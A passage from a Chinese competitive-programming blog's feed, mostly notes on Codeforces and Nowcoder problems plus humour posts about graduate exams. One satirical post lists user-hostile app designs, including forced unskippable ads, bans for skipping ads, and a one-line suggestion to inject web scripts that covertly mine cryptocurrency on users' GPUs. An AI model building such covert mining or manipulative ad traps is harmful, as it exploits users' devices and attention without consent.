为什么骗我?<br>为什么要和我抢软微，明明是我先来的啊?<br>絶対に許さない！不能原谅你们！<br>我要拿回我的软微！ta是我的！是属于我一个人的！<br>啊，这就是近距离看软微的感觉吗?<br>为什么我的一直在狂跳，都快从喉咙里跳出来了。原来是这样啊…只有我对软微是真心的啊</p><p>第五节</p><p>当我拥有软微，无论是在百货公司买领带，还是在厨房收拾一尾鱼，我都觉得幸福。爱像一股暖流滋润着我。而如果我错过软微，即便应对鸟语花香我也兴味索然。一切显得落寞，虚空。善于感知的心变得迟钝，甚至无法捕捉自我的灵魂。失去了软微是悲伤的，更让人难过的是我迷失了自己的心</p><blockquote><p>老年记</p></blockquote><p>第一节</p><p>73岁，你在医院的病床上 ，从昏迷中醒来，身边聚满了人，<br>你迷迷糊糊的看见医生摇了摇头，<br>周围那些人神情肃穆。<br>你明白了，你要死掉了，<br>你没有感到一丝害怕 ，<br>你突然问自己，<br>我到底是什么时候死掉的呢？<br>你想起22岁的那场考试，<br>原来，那时候，你就死掉了吧。<br>依照惯例，死前的3秒，<br>你的大脑要走马灯，倒叙你这73个年头的一生，画面一张一张的过，<br>1秒、2秒、两秒过去了，你面无表情的看着这两秒内的回忆。<br>第3秒，突然你笑了。<br>原来已经回到了22岁的那一年，你看见一个男孩，他拿着王道408复习全书，<br>背着书包，后面跟着一群男孩，他们手里都拿着408复习全书。<br>他朝大兴看了看，<br>那是22岁的他所向往的校园，<br>你想不起来大兴长什么样子了，<br>最后一秒你努力的回忆着，<br>然后终于笑了出来。<br>3秒过去了，身边的人突然间开始嚎啕大哭，你可能听不清了，<br>你最后听到的嘈杂的声音，<br>是一群二十出头的年轻人，<br>起着哄说的：抄底北大软微，拥抱408！</p><p>第二节</p><p>当汝老矣，顾一生，则知觉：何时暗下决考软微、何时搭上大兴之属车，盖命之变。但当时在三岔路口，见风千樯，汝报考之那一日，在日记上，其应与常，当时犹以为生中常之日。</p><p>第三节</p><p>当你老了，回顾一生，就会发觉：什么时候暗下决心考软微、什么时候搭上去大兴的列车，其实都是命运的巨变。只是当时站在三岔路口，眼见风云千樯，你报考的那一日，在日记上，相当的沉闷和平凡，当时还以为是生命中普通的一天。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;人不能把有限的精力放到无限的寻找段子中去,所以这里几乎停止维护.&lt;/p&gt;
&lt;h2 id=&quot;爆笑题解&quot;&gt;爆笑题解&lt;/h2&gt;
&lt;p&gt;数竞党的防御性证明会用严谨的逻辑说明结论的正确性，而对“解题思路是如何想到的”一类的问题没有任何启发；oier/acmer 的题解则大多会提示我们</summary>
      
    
    
    
    <category term="LAUGH" scheme="https://narafluorine.github.io/categories/LAUGH/"/>
    
    
    <category term="OTH" scheme="https://narafluorine.github.io/tags/OTH/"/>
    
  </entry>
  
  <entry>
    <title>解谜杂项</title>
    <link href="https://narafluorine.github.io/2024/10/31/30009_%E8%A7%A3%E8%B0%9C%E6%9D%82%E9%A1%B9/"/>
    <id>https://narafluorine.github.io/2024/10/31/30009_%E8%A7%A3%E8%B0%9C%E6%9D%82%E9%A1%B9/</id>
    <published>2024-10-31T00:18:38.000Z</published>
    <updated>2025-12-22T14:17:38.091Z</updated>
    
    <content type="html"><![CDATA[<p>CCBC等待补题.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CCBC等待补题.&lt;/p&gt;
</summary>
      
    
    
    
    <category term="GAME" scheme="https://narafluorine.github.io/categories/GAME/"/>
    
    
    <category term="Algorithm" scheme="https://narafluorine.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>软件诞生记</title>
    <link href="https://narafluorine.github.io/2024/10/28/30005_%E8%BD%AF%E4%BB%B6%E8%AF%9E%E7%94%9F%E8%AE%B0/"/>
    <id>https://narafluorine.github.io/2024/10/28/30005_%E8%BD%AF%E4%BB%B6%E8%AF%9E%E7%94%9F%E8%AE%B0/</id>
    <published>2024-10-28T03:27:35.000Z</published>
    <updated>2025-08-07T17:46:18.232Z</updated>
    
    <content type="html"><![CDATA[<p>如何写一个十分反人类但是没有办法绕过的程序?</p><h2 id="定期退出登录">定期退出登录</h2><p>不定期就让你重新登陆一次,刷掉所有的机器账户.</p><h2 id="云控">云控</h2><p>控制客户端版本使用的方案</p><h2 id="提前打包">提前打包</h2><p>提前在更新包内塞入好几套系统(比如配色什么的),切换的时候就一个开关的事,和用户半点关系没有.</p><h2 id="插入广告">插入广告</h2><p>广告联盟.离线广告也是可取的.</p><h2 id="更新版本">更新版本</h2><p>没人知道你自己写的APP新版本会彻底废掉还是咋样.(可以在登陆的时候返回更新版本的弹窗,卡掉通过启动断网逃避系统更新的傻逼)</p><h2 id="没网直接退出">没网直接退出</h2><p>不解释.</p><h2 id="提交伪装">提交伪装</h2><p>提交某表单时,用户点提交之后不显示立刻提交,而是加一段动画(比方说一个时针慢慢转一圈啥的)硬控用户,同时底端添加广告.</p><h2 id="先升后降">先升后降</h2><p>486:截止到上周是宣传活动,可以免费赠送,<br>但从这周开始必须要收费了,<br>不过考虑到之前的缘分,<br>不要3000,只要2500日元(原价)!</p><h2 id="客户端跑脚本">客户端跑脚本</h2><p>可以通过网页端塞脚本让用户挖矿赚钱,反正别人的显卡也不是自己的.</p><h2 id="广告广告">广告广告</h2><ol><li>记录播放广告次数和总启动次数,一旦广告播放次数低于20%直接封号,从根源上禁止跳过广告.</li><li>晃动手机取消广告跳转(反过来)</li><li>(youtube模式)很长的广告,开头禁止跳过,中间可以.</li><li>屏幕中间有一个小球,掉下去就触发广告,</li><li>屏幕中间有一个小球,屏幕上还有一个球框,通过球框不会触发广告,</li><li>跳过广告,但是你要输入&quot;广告标语&quot;完成一个类似人机验证的东西,久而久之广告词的内容就会被强制记住…</li><li>检测到您的网络环境有风险，请输入“有通义通通搞定”完成安全校验(对上一个广告的升级)</li><li>左边跳过右边查看广告,两个交替出现,</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如何写一个十分反人类但是没有办法绕过的程序?&lt;/p&gt;
&lt;h2 id=&quot;定期退出登录&quot;&gt;定期退出登录&lt;/h2&gt;
&lt;p&gt;不定期就让你重新登陆一次,刷掉所有的机器账户.&lt;/p&gt;
&lt;h2 id=&quot;云控&quot;&gt;云控&lt;/h2&gt;
&lt;p&gt;控制客户端版本使用的方案&lt;/p&gt;
&lt;h2 id=&quot;提前打</summary>
      
    
    
    
    <category term="LIVE" scheme="https://narafluorine.github.io/categories/LIVE/"/>
    
    
    <category term="OTH" scheme="https://narafluorine.github.io/tags/OTH/"/>
    
  </entry>
  
  <entry>
    <title>Codeforces 2025</title>
    <link href="https://narafluorine.github.io/2024/10/16/20012_CF_2025/"/>
    <id>https://narafluorine.github.io/2024/10/16/20012_CF_2025/</id>
    <published>2024-10-16T14:16:10.000Z</published>
    <updated>2025-10-23T06:32:47.086Z</updated>
    
    <content type="html"><![CDATA[<p>有必要写一些div2的EF了,不然代码怎么打都不知道了…</p><h1><a href="https://codeforces.com/contest/2007">CF969 div2</a></h1><h2 id="E">E</h2><p>给定一棵 dfs 序标号的树,每条边有不确定的非负整数边权,但你只知道边权和.定义 $f_i$ 为所有安排边权的情况下, $i$ 与 $(i\mod n)+1$ 的距离的最大值.每次告诉你一条边的边权,求此时所有 $f_i$ 之和.</p><p>解法：树按 dfs 序标号，所以最终的 $n$ 条路径中，每条边恰好被经过两次。一条路径的权值可能是：已经全部确定，那就确定了；没有全部确定，权值是边权和减去路径外知道的边的权值和。用全局加的 tag 维护即可。</p><p>然而…说是这么说,怎么写呢?<br>首先记录深度dep,fa表示深度和爹.<br>然后记录len表示 $i$ 到 $i+1$ 的路径长度.<br>我们知道每条路径会被经过两次,所以记录 $c1$ 和 $c2$ 表示路径两次经过的起始点,然后按照深度去加长度知道碰到一起,总路径和确定,所以复杂度确定.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>,u,v;i&lt;=n;++i)&#123;</span><br><span class="line">u=i,v=i+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(i==n)v=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(u!=v)&#123;</span><br><span class="line"><span class="keyword">if</span>(dep[u]&lt;dep[v])<span class="built_in">swap</span>(u,v);</span><br><span class="line">(c1[u]==<span class="number">0</span>?c1[u]:c2[u])=i;</span><br><span class="line">u=ko[u];</span><br><span class="line">len[i]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为每个边只会被经过两次,所以这个边确定只会让两个路径的len–,也就是不确定的边长度–.如果变成0那么这个边完全确定下来,就减掉自由边.</p><h1><a href="https://codeforces.com/contest/2064">CF1005 div2</a></h1><h2 id="C">C</h2><p>Flu发现首先删掉能直接删掉的,然后必然剩下负的和正的想冲,就想比较哪个大取全正的,结果不对.</p><p>题解说:不管冲不冲,每次肯定是删最左端的正数,或者最右端的负数,所以可以枚举这个边界点,维护前后缀即可.</p><h2 id="D">D</h2><p>给一个数列,q次询问,每次从左端开始,如果数字比数列大,那就得分+1,吃掉数列,数字变成抑或这个数字.(多次询问独立),问每个询问的最大得分.</p><p>规定 $\mathrm{msb}(a)$ 表示最高位.假如当前msb高于一个数字,一定能吃掉.假如低于则一定不能吃掉.假如相等,可以通过维护抑或前缀和来快速计算能不能吃掉.</p><p>同理,发现吃掉这个msb一样的之后就不能再吃msb更高的了,也就是整个数列最多分成log段,直接维护即可.</p><h2 id="E-2">E</h2><p>非常色的题.</p><p>AB玩一个游戏,在一个01串上,每次A可以选两个连续的0删掉,B可以选至少一个1的连续长度2的串删掉.谁删不掉就输了,问一个01串的所有连续子串中玩家1能赢多少次.</p><p>首先假设ab都可以随便选不连续的,那么游戏就变成了对01个数进行统计得出答案.显然玩家2是尽可能删01最后再删11,而且没0可用的轮不会持续很久,所以一轮理论上会删 <code>0010</code> .我们设0是1,1是-3,这样玩家的胜负可以用01串的数字大小表示了.据此得到4个偏移.</p><p>然后我们发现,选连续的串对玩家2是假的,因为字符串上只要存在1必定有01相连.<br>观察之后还可以发现,选连续的0对玩家1也是假的.什么情况不会形成连续的0?只有 <code>0101010</code> 这种,然而此时就算不连续玩家1也是输的.</p><p>所以选连续 <code>00</code> 的这个限制自始至终就是诈骗条件,根本不用管.<br>问题转化为我们要找到所有子串,然后评估其是否大于1.</p><p>前缀和+权值线段树.</p><h1><a href="https://codeforces.com/contest/2095">CF愚人节赛</a></h1><p>非常妙的一场,有很多很新奇的脑洞值得记录.</p><h2 id="B">B</h2><p>你有一个游戏,你要赌能不能过10个测试点,这个游戏很像伯努利分布,发现在两端概率最高,是1/2,所以10个点就是要赌1/1024的概率,显然不太对劲.</p><p>发现输出没有要求一定要在给定的16个格子内,所以输出17或者-1就完事了,(很仙的题啊),</p><h2 id="C-2">C</h2><p>问你这个题有多少个测试点,<br>题解说告诉大家CF有一个filter功能,能看谁过了多少个测试点,然后对filter二分即可,但是要求必须要有一个过这个题的才行.</p><h2 id="D-2">D</h2><p>盒人题.Flu经过测试发现 Google Earth给出的地理坐标有较大的偏差(7km左右),而Google Map精确度很高,是这样.</p><h2 id="E-pair-count">E pair count</h2><p>正常的题面,正常的数据范围,不正常的链接.<br>这个题的XOR的链接并不是维基百科上面的链接,而是一个wordle,解出来发现是MULTIPLY(相乘),于是你要找到任意三次方相乘等于k的下标.</p><p>k可以是0,模数只保证是质数并没有其他性质.</p><h3 id="在这个题爆了个大bug-非常重要-之前从来没见过的bug">在这个题爆了个大bug,非常重要,之前从来没见过的bug</h3><p>正常求逆元是mod-2,直接快速幂.<br>然而对0求逆元的时候正好对2取模,会导致出现 <code>qp(0,0,2)</code> 的情况,返回值是1,然而0的逆元显然因为不存在所以是0,就在这狠狠地被肘了.</p><h2 id="F-1-3-of-the-problem">F 1/3 of the problem</h2><p>三分之一在这里(你看到了),于是…</p><p>剩下的三分之二在俄文区…(草)</p><h2 id="G-绝对是一个图论问题">G &lt;绝对是一个图论问题&gt;</h2><p>乍一看有很高深的算法,又是从n个点选k个又是1e5的,算法很神秘.<br><strong>然而</strong> 最后有一句话: <strong>没有三个点位于一个圆上</strong> .什么意思?任意三点都不构成圆,意味着所有的点都是共线的,排一遍序扫一下就完事了,这个题非常诈骗.诈骗!</p><h2 id="H">H</h2><p>给一张高斯模糊过的图片,你要逆过来解密高斯模糊(PS大法似乎不顶用),所以这个题偏CTF风格,笔者抄的题解脚本,</p><h2 id="J">J</h2><p>题解说视频讲解能够提前&quot;首映&quot;出来,然后听歌识曲得到音乐名的提示,然后从PPT中得到输入输出格式,最后提交类似flag的题目名称.</p><h1><a href="https://codeforces.com/contest/171">CF愚人节赛2012</a></h1><h2 id="D-3">D</h2><p>非常妙的题,题面是说有5个点,不告诉你输入具体是几,你要猜一个1-3的数(也就是说只要穷举,大家都能作对,只是交多少发的问题,这个题背景就很妙)</p><p>Flu采取的类似二分的策略,最后+9过的(中间唐了一发).<br>首先你可以通过所有未知编号的测试点使用一样的数来确定第一个被卡掉的点不是几,然后对未知的点二分,找到第一个过的点,就能清楚第几个点实际是几以及答案是几,当然这个题本身很有趣,但是很看脸.</p><h2 id="E-3">E</h2><p>给你一种未知语言的编译器,让你使用这种语言输出这种语言的名字.</p><p>随便做点什么,然后查看报错信息,查到是INTERCAL(在搜索偏门信息方面感觉AI明显不如搜索引擎,不知道咋回事)</p><h2 id="C-3">C</h2><p>仍然是一种新编程语言,这次叫做Chef,代码是一句一句类似食谱的步骤.这次是要理解程序在干什么然后去模拟这个过程.</p><h2 id="G">G</h2><p>给三个数字猜规律.</p><p>规律:前两个数字是类斐波那契数列的开始,第三个是需要求的索引…好难猜.</p><h1><a href="https://codeforces.com/contest/290">CF愚人节2013</a></h1><h2 id="A">A</h2><p>给一个数字,猜字符串.<br>上网搜发现是美国历届总统的名字.</p><p>然后交,WA了,看了答案才知道除了那个名字带 <code>Van</code> 的都是只取最后一个单词.</p><h2 id="C-4">C</h2><p>一个新的语言理解题,语言叫做lolcode,是一个网络用语写成的语言.</p><h1><a href="https://codeforces.com/contest/409">CF愚人节2014</a></h1><h2 id="A-2">A</h2><p>看样例猜规则系列,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[]()[]<span class="number">8</span>&lt;       <span class="number">8</span>&lt;<span class="number">8</span>&lt;()</span><br><span class="line"><span class="number">8</span>&lt;[]()<span class="number">8</span>&lt;       []<span class="number">8</span>&lt;[]</span><br><span class="line"></span><br><span class="line">TEAM <span class="number">2</span> WINS    TIE</span><br></pre></td></tr></table></figure><p>emmm…首先看第一个 <code>[]</code> 应该是小于 <code>8&lt;</code> 的,然后看第二个, <code>[]</code> 应该是介于 <code>()</code> 和 <code>8&lt;</code> 之间的,所以推测 <code>()</code> &lt; <code>[]</code> &lt; <code>8&lt;</code> .交上去WA了…然后不知道咋做看题解了.<br>题解说这是石头剪子布…<br>Flu还是做解密题做太少了.</p><h2 id="B-2">B</h2><p>还是猜语言,这次是Fortran…</p><h2 id="D-4">D</h2><p>给一堆基本事实,然后给输入猜输出.<br>题解说有的事实是假的,所以你只需要判断真假就行了…</p><h2 id="F-000001">F 000001</h2><p>题解说,即使一个问题没有描述,它最起码有一个名称.你要找到一个1-64对应数字的哈希,应该怎么办?显然是上网查.上哪里查?显然是OEIS.所以答案就是oeis A000001,并不是数字-1之后的二进制长度.</p><h2 id="G-on-a-plane">G on a plane</h2><p>在飞机上(一说,在平面上)</p><p>非常生草的事情是,把样例给出的点画在图上发现是 <code>5+AVG Y</code> …<br>样例才是题干…</p><p>破防了,以后再也不做愚人节题目了.</p><h1><a href="https://codeforces.com/contest/2111">CF2111</a></h1><p>E玄学WA,不知道为啥,最后重回蓝名.</p><h2 id="E-4">E</h2><p>给一个abc组成的字符串,每次给一个操作 <code>op-&gt;oop</code> 字符直接替换,求最后字典序最小的字符串.首先分情况一下得到只有以下操作是有效的:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b-&gt;a</span><br><span class="line">c-&gt;a</span><br><span class="line">b-&gt;c-&gt;a</span><br><span class="line">c-&gt;b-&gt;a</span><br></pre></td></tr></table></figure><p>然后要对 <strong>字符串</strong> 每一为进行枚举,能变a直接变a不能就对前一个操作二分后一个操作,把所有修改都丢set里即可.<br>不知道为什么玄学WA,场上大家似乎都在WA…</p><h2 id="F">F</h2><h1><a href="https://codeforces.com/contest/2119">CF2119</a></h1><h2 id="E-5">E</h2><p>神秘组合数学题.</p><p>首先改变思考方式:对于一个数列的计算权值很困难,我们换一个计算方式:<br>对每一个token计算是被谁删掉的,得到一个p数组.</p><p>这个p数组对答案的贡献是 $\prod p_i$ ,因为每一个p都可能出现在不比p大的位置,所以考虑dp.<br>倒着考虑:假设f(i,j)表示后i行选了j个的情况.假设这一行不删,那就是f(i+1,j),如果删,那么权重是i(swap一下:每个token选一行,这意味着这个token可以选(n-i+1)-(j-1)个token),而且转移是从f(i+1,j-1)开始.</p><h1><a href="https://codeforces.com/contest/2124">CF2124</a></h1><h2 id="E-6">E</h2><p>给你一个数列a,你每次要构造一个数列b,满足在某一点上前缀和等于不算这个数的后缀和,然后a-b,直到把a减成0.最多进行17次操作,n最大5e4.</p><p>居然是巨大的诈骗题,正解只需要3次,甚至能合并成两次…<br>首先判定无解:存在一个大于一半的数,或者sum是奇数.</p><p>然后特判掉存在一个点满足前缀和与剩下的数字一样,这么着是一次就完事.<br>然后考虑3个元素的情况:设这三个数字分别为[a+b,b+c,c+a],解方程能得到abc的值,然后分别消掉就行了,而且很多个元素可以被归类到这三种情况中.</p><p>然而实际上abc可能解出负数,这个时候就需要a+b+b+c大于总和的一半,就能得到正确答案.</p><h1><a href="https://codeforces.com/contest/2130">CF2130</a></h1><h2 id="D-5">D</h2><p>给你一个排列,每个数可以反转为 $2n-p_i$ ,问你最少的逆序对是多少,n方可过.</p><p>赛时自己想不出来,队友指点一下秒过.假如一个数很小,那么它rev之后是最大的,所以要倒着枚举,枚举rev和不rev的贡献,然后取最小的即可.</p><blockquote><p>因为从小到大,反转操作没有后效性<br>不翻,后面无论翻不翻都比你大<br>翻了,后面无论翻不翻都比你小<br>所以如果是贪心一定是这样<br>然后维护个树状数组啥的感觉就差不多了</p></blockquote><h1><a href="https://codeforces.com/contest/2127">CF2127</a></h1><h2 id="C-5">C</h2><p>赛时居然没想起来???我草了.</p><p>首先,答案贡献是abs,所以对于任何人,ab以内可以随意swap,我们假设所有a&gt;b.<br>其次,什么时候第二个人会发力?只有前一个全部大于后一个的时候才能交换,比如(7,5)和(3,1)的时候可以变成(7,3)和(5,1).<br>考虑线段:所有线段不相交的时候一定会有贡献,答案就很好算了…<br>所以排个序,然后找一下相交…</p><h2 id="D-6">D</h2><p>刚开始我写的做法是枚举对面有什么,然后尝试对这个方法进行反转,x2或者x4.<br>但是比如1-2的数据反转只有两种情况,所以Flu懵逼了,这个题就没开出来,</p><h1>[CF2143]</h1><p>赛时不会,QianK佬发现了D的规律,然而还是不会DP…<br>为什么每次想上分都会被神秘DP题卡死…</p><h2 id="D1">D1</h2><p>一个序列被称作&quot;好&quot;当且仅当对于任意 $i&lt;j$ 若有 $b_i&gt;b_j$ 则i和j颜色必须不同.<br>现在给你一个序列a,你只有两种颜色,问a的子序列(可以为空)的好序列的个数.</p><p>转化题意:逆序对必须异色-&gt;同色元素不能逆序-&gt;同色元素非降<br>所以满足要求序列一定是两条非降序列<br>根据Dilworth定理,b不存在长度为3的严格下降序列<br>此事在导弹拦截中亦有记载…</p><p>参考<a href="https://www.luogu.com.cn/article/0zflxma4">这篇题解</a>: $dp[i][j][k]$ 表示当前第i个元素,第一条链最大值是j,第二条链最大值为k的情况:<br>如果dat[i]不被选中,那么直接从上一层加即可.<br>如果dat[i]&gt;=j,那么 $dp[i][dat[i]][k]+=dp[i-1][j][k]$<br>如果 $dat[i]&lt;j$ ,但是 $dat[i]&gt;=k$ ,考虑转移到第二条链.</p><h2 id="D2">D2</h2><p>上面程序的加强版,n被放大到了2000.<br>我们注意到,上面的程序更新的时候是这样:假设有这么多格子,在dat=3的时候这么更新:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     1  2  3</span><br><span class="line"></span><br><span class="line">1    1  2  3</span><br><span class="line">2    4  5  6</span><br><span class="line">3    7  8  9</span><br><span class="line">4   10 11 12</span><br></pre></td></tr></table></figure><p>首先是7这个格子,会把整列求前缀和(1+4+7),然后加到7.<br>8同理:(2+5+8)加到7.因为一个数字能加第一条链就绝对不会加进第二条链,所以不会更新9(也就是两条链末尾一样).<br>然后关键来了:我们会求行的前缀和(10+11+12),然后加到12.</p><p>这启发我们建2n棵树状数组,维护横行数列的前缀和情况.<br>直接更新就可以了…</p><h2 id="E-7">E</h2><p>感觉是被e的位置吓怕了,根本不敢写…<br>但是这个题实际上似乎没那么难.</p><p>给一个括号串,你一次操作能让两个连续且符号相同的括号反向( <code>))-&gt;((</code> , <code>((-&gt;))</code> ),然后问你下面指定的括号序列能不能操作成一个能被括号匹配的序列.</p><p>题解非常妙:首先奇数无解.<br>然后对于两个连续的括号,他们可以随意移动,ie <code>)((</code> -&gt; <code>)))</code> -&gt; <code>(()</code><br>所以我们先提取出来所有的连续两个括号(注意要用栈匹配,因为 <code>())(</code> -&gt; <code>(())</code> )<br>那么剩下的串只可能是:1.空串2. <code>()()()()</code> 3. <code>)()()()(</code>因为剩下的串不含两个连续的,所以奇数个 <code>))</code> 这种二连串无解.<br>如果二连串为0,那么3无解.<br>剩下的情况都有解,考虑 <code>((((中间剩下的串))))</code> 即可.</p><h1>[CF2150]</h1><h2 id="C-6">C</h2><p>alice和bob在一个商店选购商品.每个商品有dat i的价值,同时alice和bob各有一个排列a和b,每个人进商店会优先按照排列取需要拿的物品.最后问你合理安排顺序后alice能拿到的物品的和的最大值.</p><p><a href="https://www.cnblogs.com/Kescholar/p/19111267#e---limited-edition-shop">ref</a>.在滚动的时候强制pos[a[i]]以前的区间加a[i]表示必须选a[i],然后这个时候不选a[i]的最大值会被转移到pos[a[i]]+1表示bob这个时候选到了a[i],所以能拿到最大值.</p><h2 id="D-7">D</h2><h1>[CF2162]</h1><p>Flu几乎每次碰到div3必上分，可能是菜完了…</p><h2 id="F-2">F</h2><p>给定区间,你要构造一个排列满足m个子区间[l,r]的mex(mex([l1,r1]),mex[l2,r2]…)最小.<br>nm都是3000,就是神秘构造.</p><h2 id="G-2">G</h2><p>构造一棵树满足两个边节点乘积的和是一个完全平方数.$$\sum_{u,v\in t}u\times v$$答案是这么构造的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 5 ... n-1</span><br><span class="line">  \ | /</span><br><span class="line">2</span><br><span class="line">   / \</span><br><span class="line">  1   3</span><br><span class="line"> /     \</span><br><span class="line">n       4</span><br></pre></td></tr></table></figure><p>非常神秘的题.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有必要写一些div2的EF了,不然代码怎么打都不知道了…&lt;/p&gt;
&lt;h1&gt;&lt;a href=&quot;https://codeforces.com/contest/2007&quot;&gt;CF969 div2&lt;/a&gt;&lt;/h1&gt;
&lt;h2 id=&quot;E&quot;&gt;E&lt;/h2&gt;
&lt;p&gt;给定一棵 dfs 序标号的</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
  </entry>
  
  <entry>
    <title>牛客2025</title>
    <link href="https://narafluorine.github.io/2024/10/16/20011_NC_2025/"/>
    <id>https://narafluorine.github.io/2024/10/16/20011_NC_2025/</id>
    <published>2024-10-16T14:16:10.000Z</published>
    <updated>2025-08-19T12:51:10.951Z</updated>
    
    <content type="html"><![CDATA[<h1><a href="https://ac.nowcoder.com/acm/contest/109081#question">牛客练习赛138</a></h1><h2 id="F">F</h2><p>逆天F构造…<br>构造一个[1,n]的排列使其构成的环满足任意两项之间差是奇质数.</p><p>结果告诉我只需要找到 $p+q=n$ 且 $p,q$ 都是奇质数的一对,然后就可以 [1,1+p,1+2p%n,…] .<br>最后用哥德巴赫猜想变种证明的,真神秘.</p><h2 id="G">G</h2><p>对于给定的 $n,k$ 计算$$\sum_{m\equiv1\mod k}^n\binom{n}{m}\mod (1e9+7)$$这个题乍一看无从下手,再一看k只有 $100$ 而n有1e7.<br>首先考虑特殊情况:k=1,这就是 $2^{n}-1$ .<br>对于k=2有$$\binom n1+\binom n3+…$$考虑二项式定理,上面就是 $(x+1)^n$ 的 $x$ 项的系数.<br>于是对于更普遍的情况,有:$$(1+x)^n \mod (x^k-1)$$答案是 $x$ 的系数.</p><blockquote><p>为什么模 $(x^k-1)$ 而不是模 $(x^k)$ ?<br>因为前者可以让 $x^k\equiv 1$ (也就是变成了循环多项式环)而后者会让 $x^k,x^{k+1},…\equiv 0$ 也就是多项式高位全部丢掉了.</p></blockquote><p>最后对n套一个快速幂就能算出来答案了,复杂度 $O(T\log nk^2)$ .</p><h1>某个典1</h1><p>你有一个数列,每次可以选最大的几个数让他们-1,求你最多能做多少次操作.</p><p>这个题的结论是:对于<a href="https://atcoder.jp/contests/abc368/tasks/abc368_b">两个元素</a>,公式如下(假设 $a_1$ 是数列 $a$ 中最大的元素):$$\min\left(\left\lfloor\frac{\sum a}{2}\right\rfloor,\sum a-a_1\right)$$对于三个元素,可以做拓展如下:$$\min\left(\left\lfloor\frac{\sum a}{3}\right\rfloor,\left\lfloor\frac{\sum a-a_1}{2}\right\rfloor,\sum a-a_1-a_2\right)$$四个元素同理:$$\min\left(\left\lfloor\frac{\sum a}{4}\right\rfloor,\left\lfloor\frac{\sum a-a_1}{3}\right\rfloor,\left\lfloor\frac{\sum a-a_1-a_2}{2}\right\rfloor,\sum a-a_1-a_2-a_3\right)$$</p><h1>河南萌新3</h1><p>随便整一场河南萌新看看什么样.</p><h2 id="A">A</h2><p>给一个数列,求长度至少为l的连续子串的最大平均值.</p><p>二分答案,然后对数列减掉答案剩下的东西做一个前缀和,然后根据前缀和的原理取前缀min直接检查即可.</p><h2 id="C">C</h2><p>给一棵树,要你对每个点算出除了该节点子树和该节点到根节点1的简单路径之外所有节点的gcd(如下图5的答案就是dat[4],2的ans是0),1e5.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1-3-2-4</span><br><span class="line">    |</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>研究树的好题:我们在dfs的时候发现,这一个点的gcd会被切成两部分:dfs前面和dfs后面的,所以考虑拼起来:<br>首先维护dfs顺序,发现答案是退出dfs节点的gcd.<br>所以直接正着dfs一遍,再倒着dfs一遍即可.</p><h2 id="D">D</h2><p>选一个点之前必须选路上的所有父节点,其实就是裸的前置条件背包(好好复习背包九讲)</p><h2 id="I">I</h2><p>给两个数组ab代表两个环,上面的可以旋转,问你最大能匹配上多少个.</p><p>拆贡献:对于每一个数字枚举在b中出现哪些,意味着在这些点会有贡献,贡献最后加一起取max即可.</p><h2 id="J">J</h2><p>第一次随机选,然后在同一行选一个,然后再在上一个元素同一列选一个…直到最后选无可选,问是否存在一个方式使选出来的元素抑或和不是0.</p><p>以 <strong>每行每列</strong> 为元素建边,上述选点方式可以被抽象成在图上找简单环.</p><p>然后使用带权并查集维护即可.由于抑或和是可撤销的,所以维护节点到根节点的抑或和,然后直接抑或即可.</p><p><strong>时刻</strong> 记得边权维护的是&quot;当前根节点&quot;到该点的权值,即使实际上根节点不是这个,比如1-&gt;2-&gt;3,1的实际根节点假设是2,那么只维护1到2的信息,在查询1的根节点时发现不是2的时候要及时更新,递归解决.</p><h2 id="M">M</h2><p>给两个数列ab,可以任选下标i,问最大的sum ai=sum bi的sum ai是多少.(n1e4,ab都是1e4)</p><p>其实就是一个背包,val是他俩相减,w是a(或者b),最后答案就是0点的最大值.<br>回顾:背包问题可以把数组初始化成-inf(极小值)让背包操作只对某个单独的点生效…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;a href=&quot;https://ac.nowcoder.com/acm/contest/109081#question&quot;&gt;牛客练习赛138&lt;/a&gt;&lt;/h1&gt;
&lt;h2 id=&quot;F&quot;&gt;F&lt;/h2&gt;
&lt;p&gt;逆天F构造…&lt;br&gt;
构造一个[1,n]的排列使其构成的环满足任意两项</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
  </entry>
  
  <entry>
    <title>赛场环境的Linux</title>
    <link href="https://narafluorine.github.io/2024/10/16/20010___Linux___/"/>
    <id>https://narafluorine.github.io/2024/10/16/20010___Linux___/</id>
    <published>2024-10-16T14:16:10.000Z</published>
    <updated>2025-08-19T12:51:40.220Z</updated>
    
